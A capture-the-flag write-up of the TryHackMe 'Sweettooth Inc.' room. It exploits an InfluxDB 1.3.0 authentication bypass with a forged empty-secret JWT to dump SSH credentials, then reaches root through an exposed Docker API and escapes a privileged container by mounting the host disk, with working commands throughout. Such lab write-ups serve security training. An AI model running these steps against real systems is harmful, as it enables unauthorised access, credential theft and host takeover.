# 78 - Sweettooth Inc.

Room Link --> [https://tryhackme.com/room/sweettoothinc](https://tryhackme.com/room/sweettoothinc)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n 10.10.166.253 -p- -sV -T4

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
8086/tcp open  http    InfluxDB http admin 1.3.0
```
{% endcode %}

With a quick google search, we get to know that there has been a password bypass vulnerability in InfluxDB: [https://github.com/influxdata/influxdb/issues/12927](https://github.com/influxdata/influxdb/issues/12927)

Here is an article that confirms that our InfluxDB version of 1.3.0 is indeed vulnerable and also explains how to exploit it: [https://www.komodosec.com/post/when-all-else-fails-find-a-0-day](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day)

### InfluxDB Exploitation process

1. Discover a user name in the system via the following URL: `https://<influx-server-address>:8086/debug/requests`&#x20;

```bash
# navigate to:
http://10.10.166.253:8086/debug/requests

# outputs.
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}

# username
o5yY6yya
```

2. Create a valid JWT token with this user, an empty secret, and a valid expiry date You can use the following tool for creating the JWT: [**https://jwt.io/**](https://jwt.io/)

**header** - {"alg": "HS256", "typ": "JWT"} **payload** - {"username":"**\<input user name here>**","exp":1548669066} **signature** - HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),<**leave this field empty>**) The expiry date is in the form of epoch time.

<figure><img src=".gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# generated token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzYzMzk4MzkzfQ.7PhTuZWKzg-yg4s-c5TTBVtDQ6vgcCGRVCh8zji4_Ms
```
{% endcode %}

3. Authenticate to the server using the HTTP header: Authorization: Bearer <**The generated JWT token**>

#### Dbs

{% code overflow="wrap" %}
```bash
# to authenticate.
dking@dking ~/Downloads$ curl -G "http://10.10.217.153:8086/query" --data-urlencode "q=SHOW DATABASES" --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzYzMzk4MzkzfQ.7PhTuZWKzg-yg4s-c5TTBVtDQ6vgcCGRVCh8zji4_Ms"

# outputs
{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["creds"],["docker"],["tanks"],["mixer"],["_internal"]]}]}]}

# all the dbs here are:
creds
docker
tanks
mixer
_internal
```
{% endcode %}

<figure><img src=".gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>

The InfluxDB API documentation explains it pretty well on how to use it:

* [https://docs.influxdata.com/influxdb/v1.8/guides/query\_data/](https://docs.influxdata.com/influxdb/v1.8/guides/query\_data/)
* [https://docs.influxdata.com/influxdb/v1.8/administration/authentication\_and\_authorization/](https://docs.influxdata.com/influxdb/v1.8/administration/authentication\_and\_authorization/)

#### Tables

To show the tables in the selected database (Tables are called ‘**series**’ in InfluxDB):

{% code overflow="wrap" %}
```bash
# tables for "tanks" DB.
dking@dking ~/Downloads$ curl -G "http://10.10.217.153:8086/query" --data-urlencode "db=tanks" --data-urlencode "q=SHOW SERIES" --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzYzMzk4MzkzfQ.7PhTuZWKzg-yg4s-c5TTBVtDQ6vgcCGRVCh8zji4_Ms" -s | jq

# outputs
fruitjuice_tank
gelatin_tank"
sugar_tank
water_tank
```
{% endcode %}

#### Dump data&#x20;

{% code overflow="wrap" %}
```bash
# columns for "water_tank" table
curl -G "http://10.10.217.153:8086/query" --data-urlencode "db=tanks" --data-urlencode "q=SELECT * FROM water_tank" --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzYzMzk4MzkzfQ.7PhTuZWKzg-yg4s-c5TTBVtDQ6vgcCGRVCh8zji4_Ms" -s | jq


```
{% endcode %}

#### Create a Privileged User (admin)

You can also create a privileged account and then instead of going the curl way, simply use the [influx CLI](https://docs.influxdata.com/influxdb/v1.8/tools/shell/) tool. To create a privileged account, we need to specify the username and password with the ‘**ALL PRIVILEGES**’ privilege set.

{% code overflow="wrap" %}
```bash
# create admin user.
dking@dking ~/Downloads$ curl -X POST -G "http://10.10.217.153:8086/query" --data-urlencode "q=CREATE USER admin WITH PASSWORD 'password' WITH ALL PRIVILEGES" --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzYzMzk4MzkzfQ.7PhTuZWKzg-yg4s-c5TTBVtDQ6vgcCGRVCh8zji4_Ms" -s

# outputs
{"results":[{"statement_id":0}]}
```
{% endcode %}

Using the "influx" cmdline tool to login.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ influx -host 10.10.217.153 -username admin -password "password"

# output
Connected to http://10.10.217.153:8086 version 1.3.0
InfluxDB shell version: 1.6.7~rc0
> 
> show databases;
name: databases
name
----
creds
docker
tanks
mixer
_internal
> use creds;
Using database creds
> show series;
key
---
ssh,user=uzJk6Ry98d8C
> select * from ssh
name: ssh
time                pw         user
----                --         ----
1621166400000000000 7788764472 uzJk6Ry98d8C
```
{% endcode %}

We got the ssh user details: `uzJk6Ry98d8C : 7788764472`&#x20;

We can also view the ssh creds using our JWT token authentication.

```bash
dking@dking ~/Downloads$ curl -G "http://10.10.217.153:8086/query" --data-urlencode "db=creds" --data-urlencode "q=SELECT * FROM ssh" --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzYzMzk4MzkzfQ.7PhTuZWKzg-yg4s-c5TTBVtDQ6vgcCGRVCh8zji4_Ms" -s | jq
{
  "results": [
    {
      "statement_id": 0,
      "series": [
        {
          "name": "ssh",
          "columns": [
            "time",
            "pw",
            "user"
          ],
          "values": [
            [
              "2021-05-16T12:00:00Z",
              7788764472,
              "uzJk6Ry98d8C"
            ]
          ]
        }
      ]
    }
  ]
}

```

<figure><img src=".gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

### Initial Access

```bash
# login via ssh.
ssh uzJk6Ry98d8C@10.10.217.153 -p 2222
```

### Priv Esc to Root

With some enumeration, we see that we are in a docker container. In the root directory, there are two suspicious files which may be of our interest:

* entrypoint.sh
* initializeandquery.sh

After looking through the files, the ‘initializeandquery.sh’ file gives a hint that the port 8080 is being used for querying about the docker containers.

After looking through the files, the ‘initializeandquery.sh’ file gives a hint that the port 8080 is being used for querying about the docker containers.

<figure><img src="https://miro.medium.com/v2/resize:fit:756/1*nGhEIknhkpyJ-xvx714nNA.png" alt="" height="201" width="1000"><figcaption><p>Check the bottom part of initializeandquery.sh</p></figcaption></figure>

If you haven’t used this before, the documentation should help you out: [https://docs.docker.com/engine/api/v1.38/](https://docs.docker.com/engine/api/v1.38/).

Let’s see what containers are present:

```
curl -X GET http://localhost:8080/containers/json
```

<figure><img src=".gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

So i just used an online Json Parser to beautifully format this gibberish :)

<figure><img src=".gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>

From the output of this command, we get the image name as ‘**sweettoothinc**’.

We can do SSH Tunneling to access the remote port 8080 on our kali:

```bash
ssh -L 8081:localhost:8080 uzJk6Ry98d8C@10.10.217.153 -fN -p 2222
```

Now we can reach it.

```bash
docker -H localhost:8081 info

# outputs
Client:
 Context:    default
 Debug Mode: false

Server:
 Containers: 1
  Running: 1
  Paused: 0
  Stopped: 0
 Images: 16
 Server Version: 18.06.3-ce
 Storage Driver: aufs
  Root Dir: /var/lib/docker/aufs
  Backing Filesystem: extfs
  [..redacted..]
```

#### View Running Containers

```bash
docker -H localhost:8081 ps

# we an see the image name.
CONTAINER ID   IMAGE                  COMMAND                  CREATED       STATUS       PORTS                                          NAMES
40c576446c42   sweettoothinc:latest   "/bin/bash -c 'chmod…"   2 hours ago   Up 2 hours   0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc
```

#### Total Images

```bash
docker -H localhost:8081 images

REPOSITORY      TAG       IMAGE ID       CREATED       SIZE
sweettoothinc   latest    26a697c0d00f   2 years ago   359MB
influxdb        1.3.0     e1b5eda429c3   6 years ago   227MB
```

#### Check if the docker instance is running in Privileged Mode

{% code overflow="wrap" %}
```bash
docker -H localhost:8081 inspect --format='{{.HostConfig.Privileged}}' 40c576446c42

# outputs
true
```
{% endcode %}

Since it is running Privileged  instance, we can spawn a privileged /bin/bash session :)

#### Spawning Root shell

```bash
docker -H localhost:8081 exec -it sweettoothinc /bin/bash
```

<figure><img src=".gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

### Escape the Docker instance

When we check the mounted partitions we see a partition.

```bash
root@40c576446c42# df -h
Filesystem      Size  Used Avail Use% Mounted on
none             15G  4.8G  9.5G  34% /
tmpfs            64M     0   64M   0% /dev
tmpfs           247M     0  247M   0% /sys/fs/cgroup
/dev/xvda1       15G  4.8G  9.5G  34% /etc/hosts
shm              64M     0   64M   0% /dev/shm
tmpfs            99M  4.7M   94M   5% /run/docker.sock
```

So we can mount the `/dev/xvda1` partition.

```bash
root@40c576446c42# mount /dev/xvda1 /mnt
```

After mounting the partition we can check it out.

```bash
root@40c576446c42:/dev# cd /mnt/
root@40c576446c42:/mnt# ls -al
total 108
drwxr-xr-x  22 root root  4096 May 15  2021 .
drwxr-xr-x  62 root root  4096 Nov 17 17:48 ..
drwxr-xr-x   2 root root  4096 May 15  2021 bin
drwxr-xr-x   3 root root  4096 May 15  2021 boot
drwxr-xr-x   4 root root  4096 May 15  2021 dev
drwxr-xr-x 137 root root 12288 Nov 17 18:33 etc
drwxr-xr-x   3 root root  4096 May 15  2021 home
lrwxrwxrwx   1 root root    32 May 15  2021 initrd.img -> /boot/initrd.img-3.16.0-11-amd64
lrwxrwxrwx   1 root root    31 May 15  2021 initrd.img.old -> /boot/initrd.img-3.16.0-4-amd64
drwxr-xr-x  18 root root  4096 May 15  2021 lib
drwxr-xr-x   2 root root  4096 May 15  2021 lib64
drwx------   2 root root 16384 May 15  2021 lost+found
drwxr-xr-x   3 root root  4096 May 15  2021 media
drwxr-xr-x   2 root root  4096 May 15  2021 mnt
drwxr-xr-x   2 root root  4096 May 15  2021 opt
drwxr-xr-x   2 root root  4096 Nov 30  2014 proc
drwx------   2 root root  4096 May 18  2021 root
drwxr-xr-x   2 root root  4096 May 15  2021 run
drwxr-xr-x   2 root root  4096 May 15  2021 sbin
drwxr-xr-x   2 root root  4096 May 15  2021 srv
drwxr-xr-x   2 root root  4096 Apr  6  2015 sys
drwxrwxrwt   8 root root  4096 Nov 17 18:43 tmp
drwxr-xr-x  10 root root  4096 May 15  2021 usr
drwxr-xr-x  12 root root  4096 May 15  2021 var
lrwxrwxrwx   1 root root    28 May 15  2021 vmlinuz -> boot/vmlinuz-3.16.0-11-amd64
lrwxrwxrwx   1 root root    27 May 15  2021 vmlinuz.old -> boot/vmlinuz-3.16.0-4-amd64
root@40c576446c42:/mnt# ls -al home
total 12
drwxr-xr-x  3 root         root         4096 May 15  2021 .
drwxr-xr-x 22 root         root         4096 May 15  2021 ..
drwxr-xr-x  2 uzJk6Ry98d8C uzJk6Ry98d8C 4096 May 17  2021 sweettooth
root@40c576446c42:/mnt# cd root/
root@40c576446c42:/mnt/root# ls -al
total 28
drwx------  2 root root 4096 May 18  2021 .
drwxr-xr-x 22 root root 4096 May 15  2021 ..
lrwxrwxrwx  1 root root    9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   66 May 15  2021 .selected_editor
-rw-------  1 root root 1611 May 15  2021 .viminfo
-rw-r--r--  1 root root   22 May 15  2021 root.txt
root@40c576446c42:/mnt/root# cat root.txt 
THM{nY2ZahyFABAmjrnx}
root@40c576446c42:/mnt/root#
```

Done!

















